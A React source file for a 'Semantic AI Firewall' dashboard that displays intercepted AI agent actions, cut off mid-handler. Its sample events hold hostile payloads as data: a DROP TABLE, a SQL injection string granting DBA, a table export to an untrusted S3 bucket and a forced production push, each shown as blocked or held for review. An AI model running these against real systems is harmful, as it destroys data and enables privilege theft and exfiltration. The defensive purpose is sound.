import { useEffect, useMemo, useState, type Dispatch, type SetStateAction } from 'react';
import {
  Activity, AlertTriangle, ArrowDownToLine, ArrowRight, Ban, Check, CheckCircle2,
  ChevronRight, CircleHelp, ClipboardCheck, Clock3, Database, ExternalLink,
  Flame, KeyRound, Lock, LockKeyhole, Pause, Play, RefreshCw, ScanLine, Search,
  Send, Shield, ShieldAlert, Sparkles, Terminal, Timer, X,
} from 'lucide-react';
import type { Agent } from '../Agents/agentData';
import './intent-firewall.css';

export type Verdict = 'BLOCKED' | 'REVIEW' | 'ALLOWED';
export type VerdictFilter = 'ALL' | Verdict;
export type Sensitivity = 'CRITICAL' | 'HIGH' | 'MODERATE' | 'LOW';

export type IntentEvent = {
  id: string;
  time: string;
  timestamp: string;
  agentId: string;
  agentName: string;
  operation: string;
  operationSub: string;
  permissions: string;
  permissionScope: string;
  sensitivity: Sensitivity;
  sensitivityTarget: string;
  bytes: number;
  payload: string;
  confidence: number;
  intent: string;
  targetNode: string;
  delay: string;
  verdict: Verdict;
  verdictTitle: string;
  verdictSubtitle: string;
  statusBadge: string;
  risk: number;
  riskTier: string;
  ruleId: string;
  ruleEnforceBadge: string;
  ruleText: string;
  rootCauseTitle: string;
  rootCauseText: string;
};

function getRelativeUtcTime(minutesAgo: number): string {
  const d = new Date(Date.now() - minutesAgo * 60 * 1000);
  return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' UTC';
}

export const sampleIntentEvents: IntentEvent[] = [
  {
    id: 'req_db_01_ddl_intercept',
    time: getRelativeUtcTime(2),
    timestamp: getRelativeUtcTime(2),
    agentId: 'DB-AGENT-01',
    agentName: 'DB Orchestrator',
    operation: 'DDL / DROP TABLE',
    operationSub: 'Destructive Schema Modification',
    permissions: 'QUERY: DB',
    permissionScope: 'Oracle::ORCL.agents',
    sensitivity: 'CRITICAL',
    sensitivityTarget: 'Core Sovereign Relational Table',
    bytes: 46,
    payload: 'DROP TABLE agents CASCADE CONSTRAINTS;',
    confidence: 99.8,
    intent: '“Autonomous attempt to delete and drop sovereign relational table \'agents\' from live Oracle 11g database without DBA quorum.”',
    targetNode: 'Oracle 11g Express (localhost:1521/ORCL)',
    delay: '1.12ms',
    verdict: 'BLOCKED',
    verdictTitle: 'BLOCKED',
    verdictSubtitle: 'Destructive DDL Terminated at Stage-Zero',
    statusBadge: 'SCHEMA DROP BLOCKED',
    risk: 95,
    riskTier: 'CRITICAL RISK',
    ruleId: 'POLICY-SEC-MUTATION-001',
    ruleEnforceBadge: 'STRICT_ENFORCE',
    ruleText: '“Autonomous agents strictly forbidden from dropping, truncating, or altering relational database schemas.”',
    rootCauseTitle: 'Destructive DDL Schema Modification Halted',
    rootCauseText: 'AST Intent parser confirmed DROP TABLE attempt. Zero-Mutation guardrail terminated execution at Stage-Zero before reaching Oracle Database 11g.',
  },
  {
    id: 'req_red_01_sqli',
    time: getRelativeUtcTime(5),
    timestamp: getRelativeUtcTime(5),
    agentId: 'RED-AGENT-01',
    agentName: 'Adversarial Probe X (RedAgent)',
    operation: 'SQL_INJECTION / PRIVILEGE_ESC',
    operationSub: 'Adversarial SQL Probe',
    permissions: 'REVOKED: All',
    permissionScope: 'Oracle::ORCL.sys_dba',
    sensitivity: 'CRITICAL',
    sensitivityTarget: 'Oracle Master DBA Vault',
    bytes: 64,
    payload: "'; EXEC dbms_lock.sleep(10); GRANT DBA TO RED_AGENT; --",
    confidence: 99.9,
    intent: '“Simulated adversarial injection attempting sleep denial-of-service and unauthorized acquisition of SYSDBA privileges.”',
    targetNode: 'Oracle 11g Enclave / SysDBA',
    delay: '0.84ms',
    verdict: 'BLOCKED',
    verdictTitle: 'BLOCKED',
    verdictSubtitle: 'Adversarial Probe Neutralized & Agent Quarantined',
    statusBadge: 'INJECTION TRAPPED',
    risk: 99,
    riskTier: 'CRITICAL RISK',
    ruleId: 'POLICY-ADVERSARIAL-ISOLATION',
    ruleEnforceBadge: 'STRICT_ENFORCE',
    ruleText: '“Adversarial SQL probe payloads must be terminated cold with immediate agent session isolation.”',
    rootCauseTitle: 'Malicious SQL Injection Syntax Trapped',
    rootCauseText: 'AST analyzer identified SQL comment masking, sleep lock delay function, and unauthorized DBA grant command. Intercepted in 0.84ms.',
  },
  {
    id: 'req_fin_01_exfil',
    time: getRelativeUtcTime(8),
    timestamp: getRelativeUtcTime(8),
    agentId: 'FIN-AGENT-01',
    agentName: 'Finance Agent Alpha',
    operation: 'STORAGE / EXFILTRATION',
    operationSub: 'Data Loss Prevention',
    permissions: 'READ: Finance',
    permissionScope: 'Storage::Egress.DLP',
    sensitivity: 'CRITICAL',
    sensitivityTarget: 'Treasury Reserves Table',
    bytes: 78,
    payload: "EXPORT TABLE treasury_reserves TO 's3://untrusted-exfil/'",
    confidence: 99.4,
    intent: '“Autonomous attempt to export sensitive general ledger reserves to external untrusted S3 bucket.”',
    targetNode: 'Storage Egress DLP Enclave',
    delay: '1.42ms',
    verdict: 'BLOCKED',
    verdictTitle: 'BLOCKED',
    verdictSubtitle: 'Data Egress Clamped by DLP Filter',
    statusBadge: 'EXFILTRATION HALTED',
    risk: 91,
    riskTier: 'CRITICAL RISK',
    ruleId: 'POLICY-FIN-EXFIL-001',
    ruleEnforceBadge: 'STRICT_ENFORCE',
    ruleText: '“Finance agents strictly forbidden from exporting bulk ledger tables to unauthenticated external object storage.”',
    rootCauseTitle: 'Data Loss Prevention (DLP) Trap Fired',
    rootCauseText: 'Destination IP and bucket URI fail enterprise allowlist check. Session cryptographic token revoked at Stage-Zero.',
  },
  {
    id: 'req_cod_01_prod',
    time: getRelativeUtcTime(12),
    timestamp: getRelativeUtcTime(12),
    agentId: 'COD-AGENT-01',
    agentName: 'DevOps Synth Bot',
    operation: 'DEPLOY / PRODUCTION',
    operationSub: 'CI/CD Gating Invariant',
    permissions: 'EXECUTE: CI',
    permissionScope: 'K8s::Production.Cluster',
    sensitivity: 'HIGH',
    sensitivityTarget: 'Production Kubernetes Cluster',
    bytes: 52,
    payload: 'git push origin main --force && deploy prod',
    confidence: 97.8,
    intent: '“Direct production deployment bypass attempted without 2-person cryptographic human quorum sign-off.”',
    targetNode: 'Kubernetes Production Cluster',
    delay: '2.10ms',
    verdict: 'REVIEW',
    verdictTitle: 'REVIEW',
    verdictSubtitle: 'Action Suspended Pending Dual-Key Sign-off',
    statusBadge: 'QUORUM REQUIRED',
    risk: 68,
    riskTier: 'ELEVATED RISK',
    ruleId: 'POLICY-COD-PROD-001',
    ruleEnforceBadge: 'MANDATORY_REVIEW',
    ruleText: '“Production releases require dual-key cryptographic approval from at least two human security officers.”',
    rootCauseTitle: 'Production Deployment Quorum Gating',
    rootCauseText: 'Request queued in Human Approvals portal. Ephemeral release token will not issue without secondary officer signature.',
  },
  {
    id: 'req_res_01_vec',
    time: getRelativeUtcTime(15),
    timestamp: getRelativeUtcTime(15),
    agentId: 'RES-AGENT-01',
    agentName: 'Research Core Vector',
    operation: 'HTTP / GET',
    operationSub: 'Open-Access Fetch',
    permissions: 'SEARCH: Vector, READ: Arxiv',
    permissionScope: 'Domain: export.arxiv.org',
    sensitivity: 'LOW',
    sensitivityTarget: 'Public Academic Index',
    bytes: 112,
    payload: 'GET https://export.arxiv.org/api/query?search_query=cat:cs.AI HTTP/1.1',
    confidence: 99.2,
    intent: '“Retrieve open-access machine intelligence research papers for automated literature synthesis.”',
    targetNode: 'Arxiv Open-Access Proxy',
    delay: '0.78ms',
    verdict: 'ALLOWED',
    verdictTitle: 'ALLOWED',
    verdictSubtitle: 'Request Permitted Within Scope',
    statusBadge: 'ACTION APPROVED',
    risk: 8,
    riskTier: 'LOW RISK',
    ruleId: 'POLICY-NET-001',
    ruleEnforceBadge: 'SCOPED_ALLOW',
    ruleText: '“Research agents authorized to access approved scientific repositories through isolated egress proxy.”',
    rootCauseTitle: 'Authorized External Fetch',
    rootCauseText: 'Egress destination matches global allowlist of open academic repositories. Attestation verified.',
  },
  {
    id: 'req_db_02_read',
    time: getRelativeUtcTime(18),
    timestamp: getRelativeUtcTime(18),
    agentId: 'DB-AGENT-01',
    agentName: 'DB Orchestrator',
    operation: 'SQL / SELECT',
    operationSub: 'Relational Schema Read',
    permissions: 'QUERY: DB',
    permissionScope: 'Oracle::ORCL.agents',
    sensitivity: 'LOW',
    sensitivityTarget: 'Agents Catalog View',
    bytes: 58,
    payload: 'SELECT id, name, model, role, status FROM agents;',
    confidence: 99.7,
    intent: '“Authorized read execution to verify sovereign agent status and trust scores for governance audit.”',
    targetNode: 'Oracle 11g Express (localhost:1521/ORCL)',
    delay: '142.5ms',
    verdict: 'ALLOWED',
    verdictTitle: 'ALLOWED',
    verdictSubtitle: 'Query Executed & Committed on Oracle 11g',
    statusBadge: 'ORACLE 11G COMMITTED',
    risk: 14,
    riskTier: 'LOW RISK',
    ruleId: 'POLICY-DB-001-SCOPED-ALLOW',
    ruleEnforceBadge: 'SCOPED_ALLOW',
    ruleText: '“Read queries permitted on verified schema objects when agent possesses active QUERY: DB scope.”',
    rootCauseTitle: 'Cryptographic Capability Verified',
    rootCauseText: 'Intent analysis confirms read-only SQL verb. 0 mutation commands. Executed cleanly on Oracle 11g.',
  },
];

function getRelativeUtcSeconds(secondsAgo: number): string {
  const d = new Date(Date.now() - secondsAgo * 1000);
  return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' UTC';
}

const entropyBarsData = [
  { label: `${getRelativeUtcSeconds(165)} - 32 ops/s`, height: '35%', isSpike: false },
  { label: `${getRelativeUtcSeconds(150)} - 41 ops/s`, height: '42%', isSpike: false },
  { label: `${getRelativeUtcSeconds(135)} - 37 ops/s`, height: '38%', isSpike: false },
  { label: `${getRelativeUtcSeconds(120)} - 46 ops/s`, height: '48%', isSpike: false },
  { label: `${getRelativeUtcSeconds(105)} - 50 ops/s`, height: '52%', isSpike: false },
  { label: `${getRelativeUtcSeconds(90)} - 44 ops/s`, height: '45%', isSpike: false },
  { label: `${getRelativeUtcSeconds(75)} - 59 ops/s`, height: '61%', isSpike: false },
  { label: `${getRelativeUtcSeconds(60)} - 56 ops/s`, height: '58%', isSpike: false },
  { label: `${getRelativeUtcSeconds(45)} - ANOMALOUS MUTATION SPIKE 94 ops/s`, height: '96%', isSpike: true },
  { label: `${getRelativeUtcSeconds(30)} - 58 ops/s`, height: '60%', isSpike: false },
  { label: `${getRelativeUtcSeconds(15)} - 53 ops/s`, height: '55%', isSpike: false },
  { label: `${getRelativeUtcSeconds(0)} - 39 ops/s`, height: '40%', isSpike: false },
];

function downloadJson(filename: string, payload: unknown) {
  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 1000);
}

export default function IntentFirewall({
  agents,
  setAgents,
  onNotify,
  query,
  onQueryChange,
  onOpenAgentDetail,
}: {
  agents: Agent[];
  setAgents: Dispatch<SetStateAction<Agent[]>>;
  onNotify: (message: string) => void;
  query: string;
  onQueryChange: (value: string) => void;
  onOpenAgentDetail: (agentId: string) => void;
}) {
  const [events, setEvents] = useState<IntentEvent[]>(sampleIntentEvents);
  const [selectedEventId, setSelectedEventId] = useState<string>(sampleIntentEvents[0].id);
  const [filter, setFilter] = useState<VerdictFilter>('ALL');
  const [streamPaused, setStreamPaused] = useState(false);
  const [actionFeedback, setActionFeedback] = useState<string>('');
  const [socDialogOpen, setSocDialogOpen] = useState(false);
  const [reviewQueue, setReviewQueue] = useState<string[]>([]);
  const [refreshSpin, setRefreshSpin] = useState(false);

  useEffect(() => {
    if (!actionFeedback) return undefined;
    const timer = window.setTimeout(() => setActionFeedback(''), 4000);
    return () => window.clearTimeout(timer);
  }, [actionFeedback]);

  const selectedEvent = useMemo(() => {
    return events.find((item) => item.id === selectedEventId) ?? events[0];
  }, [events, selectedEventId]);

  const selectedAgent = useMemo(() => {
    return agents.find((a) => a.id === selectedEvent.agentId);
  }, [agents, selectedEvent]);

  const filteredEvents = useMemo(() => {
    const q = query.trim().toLowerCase();
    return events.filter((ev) => {
      const matchesFilter = filter === 'ALL' || ev.verdict === filter;
      const matchesQuery = !q ||
        ev.agentId.toLowerCase().includes(q) ||
        ev.intent.toLowerCase().includes(q) ||
        ev.targetNode.toLowerCase().includes(q) ||
        ev.ruleId.toLowerCase().includes(q) ||
        ev.operation.toLowerCase().includes(q);
      return matchesFilter && matchesQuery;
    });
  }, [events, filter, query]);

  function handleQuarantine() {
    const agentId = selectedEvent.agentId;
    setAgents((prev) =>
      prev.map((agent) =>
        agent.id === agentId
          ? { ...agent, status: 'quarantined', risk: 'CRITICAL', permissions: ['REVOKED: All'] }
          : agent
      )
    );
    const msg = `SUCCESS: ${agentId} placed in strict cryptographic isolation.`;
    setActionFeedback(msg);
    onNotify(msg);
  }

  function handleEscalate() {
    if (!reviewQueue.includes(selectedEvent.id)) {
      setReviewQueue((prev) => [...prev, selectedEvent.id]);
    }
    const msg = `DISPATCHED: Request forwarded to Human Governance Council with high priority.`;
    setActionFeedback(msg);
    onNotify(msg);
  }

  function handleSocTokenRequest() {
    setSocDialogOpen(true);
    const msg = `EXEMPTION: SOC Authorization Challenge initiated (Hardware Token / Duo MFA required).`;
    setActionFeedback(msg);
  }

  function handleToggleStream() {
    setStreamPaused((prev) => {
      const next = !prev;
      onNotify(next ? 'Telemetry stream paused.' : 'Telemetry stream resumed.');
      return next;
    });
  }

  function handleRefreshStream() {
    setRefreshSpin(true);
    window.setTimeout(() => {
      setRefreshSpin(false);
      const msg = 'POLLING: Stream ledger synchronized with NexusGuard Cluster.';
      setActionFeedback(msg);
      onNotify(msg);
    }, 450);
  }

  function handleExportStream() {
    downloadJson('nexusguard-intent-firewall-stream.json', {
      platform: 'NexusGuard',
      cluster: 'US-EAST-SECURE-PROD-CLUSTER-01',
      exportedAt: new Date().toISOString(),
      engine: 'Semantic AI Firewall v4.2-PROD',
      telemetryPaused: streamPaused,
      evaluationsCount: events.length,
      events,
    });
    onNotify('Exported recent firewall decision stream as JSON.');
  }

  const isQuarantined = selectedAgent?.status === 'quarantined';

  return (
    <div className="intent-firewall-page">
      {/* 1. Header Section */}
      <div className="firewall-top-header">
        <div className="firewall-title-area">
          <div className="firewall-title-row">
            <span className="firewall-icon-box">
              <Flame size={20} className="text-cyan" />
            </span>
            <div className="firewall-title-text">
              <h1>
                Semantic AI Firewall
                <span className="version-pill">v4.2-PROD</span>
              </h1>
            </div>
          </div>
          <div className="firewall-meta-row">
            <div className={`engine-badge ${streamPaused ? 'engine-badge-paused' : ''}`}>
              <span className={`live-pulse-dot ${streamPaused ? 'pulse-paused' : ''}`} />
              <span className="engine-text">
                {streamPaused ? 'ENGINE: TELEMETRY PAUSED' : 'Engine: 0-Delay Parser'}
              </span>
            </div>
            <button
              className="stream-toggle-button"
              onClick={handleToggleStream}
              type="button"
            >
              {streamPaused ? <Play size={14} /> : <Pause size={14} />}
              <span>{streamPaused ? 'Resume Stream' : 'Pause Telemetry'}</span>
            </button>
          </div>
        </div>
        <p className="firewall-description">
          Understand what an agent intends to do before allowing the action — Zero-Trust Semantic Inspection, deep syntactic parsing, and continuous behavioral attestation.
        </p>
      </div>

      {/* 2. Operational Pipeline Architecture Banner */}
      <div className="pipeline-arch-banner">
        <div className="pipeline-banner-header">
          <div className="pipeline-banner-brand">
            <ScanLine size={18} className="text-cyan" />
            <div className="pipeline-banner-titles">
              <span className="pipeline-subtitle">OPERATIONAL PIPELINE ARCHITECTURE</span>
              <span className="pipeline-maintitle">Autonomous Semantic Interception Mesh</span>
            </div>
          </div>
          <div className="pipeline-stepper">
            <span className="step-pill">AGENT REQUEST</span>
            <span className="step-arrow">→</span>
            <span className="step-pill step-pill-active">INTENT EXTRACTION</span>
            <span className="step-arrow">→</span>
            <span className="step-pill">SENSITIVE DETECTION</span>
            <span className="step-arrow">→</span>
            <span className="step-pill">POLICY EVALUATION</span>
            <span className="step-arrow">→</span>
            <span className="step-pill">RISK ANALYSIS</span>
            <span className="step-arrow">→</span>
            <div className="verdict-stepper-pill">
              <span className="verdict-opt-allow">ALLOW</span>
              <span className="verdict-slash">/</span>
              <span className="verdict-opt-review">REVIEW</span>
              <span className="verdict-slash">/</span>
              <span className="verdict-opt-block">BLOCK</span>
            </div>
          </div>
        </div>
      </div>

      {/* 3. Main Grid: Left (7 cols) and Right (5 cols) */}
      <div className="firewall-grid-container">
        {/* Left Column (7 cols) */}
        <div className="firewall-col-left">
          {/* Live Intercepted Request */}
          <div className="firewall-card live-intercept-card">
            <div className="intercept-card-top">
              <div className="intercept-title-group">
                <span className={`status-icon-box status-icon-${selectedEvent.verdict.toLowerCase()}`}>
                  {selectedEvent.verdict === 'BLOCKED' ? (
                    <Ban size={18} />
                  ) : selectedEvent.verdict === 'REVIEW' ? (
                    <Clock3 size={18} />
                  ) : (
                    <CheckCircle2 size={18} />
                  )}
                </span>
                <div>
                  <div className="intercept-heading-line">
                    <span className="intercept-heading-label">Live Intercepted Request</span>
                    <span className={`status-pill status-pill-${selectedEvent.verdict.toLowerCase()}`}>
                      {selectedEvent.statusBadge}
                    </span>
                  </div>
                  <span className="trace-id-label">TRACE ID: {selectedEvent.id}</span>
                </div>
              </div>
              <div className="intercept-timestamp-badge">
                <Clock3 size={12} />
                <span>{selectedEvent.timestamp}</span>
              </div>
            </div>

            {/* 4 Metadata Stat Boxes */}
            <div className="metadata-stat-grid">
              <div className="meta-stat-box">
                <span className="meta-stat-label">TARGET AGENT</span>
                <span className="meta-stat-value text-cyan truncate">{selectedEvent.agentId}</span>
                <span className="meta-stat-sub truncate">{selectedEvent.agentName}</span>
              </div>

              <div className="meta-stat-box">
                <span className="meta-stat-label">REQUESTED OPERATION</span>
                <span className={`meta-stat-value text-${selectedEvent.verdict === 'BLOCKED' ? 'red' : selectedEvent.verdict === 'REVIEW' ? 'amber' : 'green'} truncate`}>
                  {selectedEvent.operation}
                </span>
                <span className="meta-stat-sub truncate">{selectedEvent.operationSub}</span>
              </div>

              <div className="meta-stat-box">
                <span className="meta-stat-label">AGENT PERMISSIONS</span>
                <span className="meta-stat-value text-blue truncate">
                  {isQuarantined ? 'REVOKED (ISOLATED)' : selectedEvent.permissions}
                </span>
                <span className="meta-stat-sub truncate">{selectedEvent.permissionScope}</span>
              </div>

              <div className="meta-stat-box">
                <span className="meta-stat-label">SENSITIVITY TIER</span>
                <span className={`meta-stat-value text-${selectedEvent.sensitivity === 'CRITICAL' ? 'red' : selectedEvent.sensitivity === 'HIGH' ? 'amber' : 'cyan'} truncate`}>
                  {selectedEvent.sensitivity}
                </span>
                <span className="meta-stat-sub truncate">{selectedEvent.sensitivityTarget}</span>
              </div>
            </div>

            {/* Raw Intercepted Payload */}
            <div className="payload-container">
              <div className="payload-header-row">
                <span className="payload-section-title">
                  Raw Intercepted Payload [SQL Stream / Hook]
                </span>
                <span className="payload-length-badge">Length: {selectedEvent.bytes} bytes</span>
              </div>
              <div className="payload-code-block">
                <pre>
                  <code className={`code-${selectedEvent.verdict.toLowerCase()}`}>
                    {selectedEvent.payload}
                  </code>
                </pre>
              </div>
            </div>

            {/* Natural Language Extracted Intent */}
            <div className="intent-container">
              <div className="intent-header-row">
                <span className="intent-section-title text-cyan">
                  <Sparkles size={14} className="text-cyan inline-block mr-1" />
                  Natural Language Extracted Intent
                </span>
                <span className="confidence-badge">
                  Model Confidence: {selectedEvent.confidence}%
                </span>
              </div>
              <div className="intent-quote-box">
                <p className="intent-quote-text">{selectedEvent.intent}</p>
              </div>
            </div>

            {/* Intercept Card Footer */}
            <div className="intercept-card-footer">
              <div className="footer-meta-item">
                <Database size={14} className="text-muted" />
                <span className="footer-meta-key">Target Node:</span>
                <span className="footer-meta-value">{selectedEvent.targetNode}</span>
              </div>
              <div className="footer-meta-item">
                <Timer size={14} className="text-muted" />
                <span className="footer-meta-key">Interception Delay:</span>
                <span className="footer-meta-value text-green">{selectedEvent.delay}</span>
              </div>
              <button
                className="open-profile-btn"
                onClick={() => onOpenAgentDetail(selectedEvent.agentId)}
                title={`Inspect ${selectedEvent.agentId} security identity`}
                type="button"
              >
                <ExternalLink size={12} />
                <span>Open {selectedEvent.agentId} Profile</span>
              </button>
            </div>
          </div>

          {/* Semantic Parse Entropy Curve */}
          <div className="firewall-card entropy-curve-card">
            <div className="entropy-card-header">
              <div className="entropy-header-title">
                <Activity size={16} className="text-cyan" />
                <span className="entropy-title-text">Semantic Parse Entropy Curve</span>
              </div>
              <span className="entropy-time-subtitle">Last 120s Real-time Parse Rate</span>
            </div>
            <div className={`entropy-chart-wrapper ${streamPaused ? 'chart-paused' : ''}`}>
              {entropyBarsData.map((bar, i) => (
                <div
                  key={i}
                  className={`entropy-bar ${bar.isSpike ? 'entropy-spike' : ''}`}
                  style={{ height: bar.height }}
                  title={bar.label}
                />
              ))}
            </div>
            <div className="entropy-axis-labels">
              <span>-120s</span>
              <span>-90s</span>
              <span>-60s</span>
              <span>-30s</span>
              <span>NOW (ACTIVE INTERCEPT)</span>
            </div>
          </div>
        </div>

        {/* Right Column (5 cols) */}
        <div className="firewall-col-right">
          {/* Firewall Verdict Card */}
          <div className="firewall-card verdict-card">
            <div className="verdict-card-top">
              <div className="verdict-title-group">
                <Shield size={18} className="text-cyan" />
                <span className="verdict-heading-text">Firewall Verdict</span>
              </div>
              <span className="eval-status-label">Evaluation Phase: Complete</span>
            </div>

            {/* Verdict Callout Banner */}
            <div className={`verdict-callout-banner verdict-banner-${selectedEvent.verdict.toLowerCase()}`}>
              <div className="verdict-banner-left">
                <span className="verdict-icon-sq">
                  {selectedEvent.verdict === 'BLOCKED' ? (
                    <Ban size={24} />
                  ) : selectedEvent.verdict === 'REVIEW' ? (
                    <Clock3 size={24} />
                  ) : (
                    <CheckCircle2 size={24} />
                  )}
                </span>
                <div className="verdict-text-block">
                  <span className="verdict-main-label">{selectedEvent.verdictTitle}</span>
                  <span className="verdict-sub-label">{selectedEvent.verdictSubtitle}</span>
                </div>
              </div>
              <div className="verdict-score-block">
                <div className="verdict-score-num">
                  {selectedEvent.risk}
                  <span className="score-denom">/100</span>
                </div>
                <div className="verdict-risk-tier-label">{selectedEvent.riskTier}</div>
              </div>
            </div>

            {/* Risk Score Progress Bar */}
            <div className="risk-progress-track">
              <div
                className={`risk-progress-fill fill-${selectedEvent.verdict.toLowerCase()}`}
                style={{ width: `${selectedEvent.risk}%` }}
              />
            </div>

            {/* Triggered Enclave Rule */}
            <div className="rule-enclave-section">
              <span className="section-label-mono">TRIGGERED ENCLAVE RULE</span>
              <div className="rule-detail-box">
                <div className="rule-detail-top">
                  <span className="rule-code-name text-cyan">{selectedEvent.ruleId}</span>
                  <span className={`rule-mode-tag tag-${selectedEvent.verdict.toLowerCase()}`}>
                    {selectedEvent.ruleEnforceBadge}
                  </span>
                </div>
                <p className="rule-quote-text">{selectedEvent.ruleText}</p>
              </div>
            </div>

            {/* Root Cause Analysis */}
            <div className="root-cause-section">
              <span className="section-label-mono">ROOT CAUSE ANALYSIS</span>
              <div className="root-cause-box">
                <div className="root-cause-header">
                  <AlertTriangle size={14} className="text-amber mr-1" />
                  <span className="root-cause-heading-text">{selectedEvent.rootCauseTitle}</span>
                </div>
                <p className="root-cause-paragraph">{selectedEvent.rootCauseText}</p>
              </div>
            </div>

            {/* Human-in-the-Loop Override Operations */}
            <div className="hil-operations-section">
              <span className="section-label-mono">HUMAN-IN-THE-LOOP OVERRIDE OPERATIONS</span>
              <div className="hil-button-stack">
                <button
                  className={`hil-quarantine-button ${isQuarantined ? 'quarantine-active' : ''}`}
                  onClick={handleQuarantine}
                  type="button"
                >
                  <Lock size={16} />
                  <span>
                    {isQuarantined
                      ? `Agent ${selectedEvent.agentId} Is Quarantined`
                      : `Quarantine Agent ${selectedEvent.agentId}`}
                  </span>
                </button>
                <div className="hil-secondary-actions">
                  <button
                    className="hil-secondary-btn"
                    onClick={handleEscalate}
                    type="button"
                  >
                    <Send size={14} className="text-cyan" />
                    <span>Escalate Approvals</span>
                  </button>
                  <button
                    className="hil-secondary-btn"
                    onClick={handleSocTokenRequest}
                    type="button"
                  >
                    <KeyRound size={14} className="text-amber" />
                    <span>Request SOC Token</span>
                  </button>
                </div>
              </div>

              {actionFeedback && (
                <div className="action-feedback-toast" role="status">
                  <Check size={14} />
                  <span>{actionFeedback}</span>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* 4. Recent Firewall Decision Stream (Full Width Table) */}
      <div className="firewall-card decision-stream-card">
        <div className="decision-stream-header">
          <div className="stream-header-left">
            <span className="stream-icon-box">
              <ClipboardCheck size={18} className="text-cyan" />
            </span>
            <div>
              <h2 className="stream-heading-title">Recent Firewall Decision Stream</h2>
              <span className="stream-subheading">High-velocity telemetry ledger across fleet execution nodes</span>
            </div>
          </div>
          <div className="stream-header-tools">
            <div className="verdict-filter-group" role="group" aria-label="Filter decisions by verdict">
              {(['ALL', 'BLOCKED', 'REVIEW', 'ALLOWED'] as VerdictFilter[]).map((tab) => (
                <button
                  key={tab}
                  className={`filter-tab-btn ${filter === tab ? 'filter-tab-active' : ''}`}
                  onClick={() => setFilter(tab)}
                  type="button"
                >
                  {tab}
                </button>
              ))}
            </div>
            <div className="stream-search-wrap">
              <Search size={14} className="search-icon-pos" />
              <input
                aria-label="Search telemetry ledger"
                className="stream-search-input"
                onChange={(e) => onQueryChange(e.target.value)}
                placeholder="Search agents, intents, hashes... [Ctrl+K]"
                type="text"
                value={query}
              />
              {query && (
                <button
                  className="search-clear-btn"
                  onClick={() => onQueryChange('')}
                  type="button"
                >
                  <X size={12} />
                </button>
              )}
            </div>
            <button
              className="stream-refresh-btn"
              onClick={handleRefreshStream}
              title="Poll latest fleet decisions"
              type="button"
            >
              <RefreshCw size={14} className={refreshSpin ? 'spin-anim' : ''} />
              <span>Refresh Feed</span>
            </button>
            <button
              className="stream-export-btn"
              onClick={handleExportStream}
              title="Download JSON telemetry ledger"
              type="button"
            >
              <ArrowDownToLine size={14} />
              <span>Export JSON</span>
            </button>
          </div>
        </div>

        {/* Telemetry Table */}
        <div className="table-responsive-wrapper">
          <table className="telemetry-table">
            <thead>
              <tr>
                <th>TIMESTAMP</th>
                <th>AGENT NODE</th>
                <th>SYNTHESIZED INTENT</th>
                <th>TARGET RESOURCE</th>
                <th>RISK VECTOR</th>
                <th className="text-right">VERDICT</th>
              </tr>
            </thead>
            <tbody>
              {filteredEvents.map((ev) => {
                const isSelected = ev.id === selectedEvent.id;
                const isQueued = reviewQueue.includes(ev.id);
                return (
                  <tr
                    key={ev.id}
                    className={`telemetry-row ${isSelected ? 'row-selected' : ''} ${isQueued ? 'row-queued' : ''}`}
                    onClick={() => setSelectedEventId(ev.id)}
                  >
                    <td className="font-mono text-muted">{ev.time}</td>
                    <td className="font-mono text-cyan font-bold">{ev.agentId}</td>
                    <td className="text-white font-medium">
                      <div className="intent-cell-wrap">
                        <span>{ev.operation}</span>
                        <small className="intent-cell-desc">{ev.intent.replace(/“|”/g, '')}</small>
                      </div>
                    </td>
                    <td className="text-muted">{ev.targetNode}</td>
                    <td>
                      <span className={`risk-badge risk-badge-${ev.verdict.toLowerCase()}`}>
                        Risk {ev.risk}
                      </span>
                    </td>
                    <td className="text-right">
                      <span className={`table-verdict-pill pill-${ev.verdict.toLowerCase()}`}>
                        {ev.verdict === 'BLOCKED' ? (
                          <X size={12} />
                        ) : ev.verdict === 'REVIEW' ? (
                          <Clock3 size={12} />
                        ) : (
                          <Check size={12} />
                        )}
                        <span>{ev.verdict}</span>
                      </span>
                    </td>
                  </tr>
                );
              })}
              {filteredEvents.length === 0 && (
                <tr>
                  <td colSpan={6} className="table-empty-row">
                    No fleet evaluations match “{query}” under filter “{filter}”.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        <div className="table-footer-status">
          <span>Displaying {filteredEvents.length} of {events.length} fleet intent evaluations</span>
          <span className="cluster-sync-indicator">
            <span className="sync-dot" /> Connected to NexusGuard Defense Mesh · Stream 0-Delay
          </span>
        </div>
      </div>

      {/* SOC Token Challenge Modal */}
      {socDialogOpen && (
        <div className="soc-modal-backdrop" onClick={() => setSocDialogOpen(false)} role="presentation">
          <div className="soc-modal-card" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
            <div className="soc-modal-header">
              <div className="soc-modal-title-wrap">
                <span className="soc-icon-box">
                  <KeyRound size={20} className="text-amber" />
                </span>
                <div>
                  <h3>Hardware SOC Exemption Challenge</h3>
                  <span className="soc-modal-sub">Multi-Party Authorization Quorum</span>
                </div>
              </div>
              <button
                className="soc-close-btn"
                onClick={() => setSocDialogOpen(false)}
                type="button"
                aria-label="Close SOC modal"
              >
                <X size={16} />
              </button>
            </div>
            <div className="soc-modal-body">
              <p className="soc-explanation-text">
                Authorizing an override for <strong>{selectedEvent.agentId}</strong> ({selectedEvent.ruleId}) requires hardware security key attestation (FIDO2 / YubiKey) and SOC lead sign-off.
              </p>
              <div className="soc-challenge-meta">
                <div className="soc-meta-row">
                  <span>TARGET REQUEST:</span>
                  <strong>{selectedEvent.id}</strong>
                </div>
                <div className="soc-meta-row">
                  <span>AGENT PERMISSIONS:</span>
                  <strong>{selectedEvent.permissions}</strong>
                </div>
                <div className="soc-meta-row">
                  <span>QUORUM REQUIRED:</span>
                  <strong className="text-amber">2 of 3 Security Officers</strong>
                </div>
              </div>
            </div>
            <div className="soc-modal-actions">
              <button
                className="soc-cancel-btn"
                onClick={() => setSocDialogOpen(false)}
                type="button"
              >
                Cancel
              </button>
              <button
                className="soc-submit-btn"
                onClick={() => {
                  setSocDialogOpen(false);
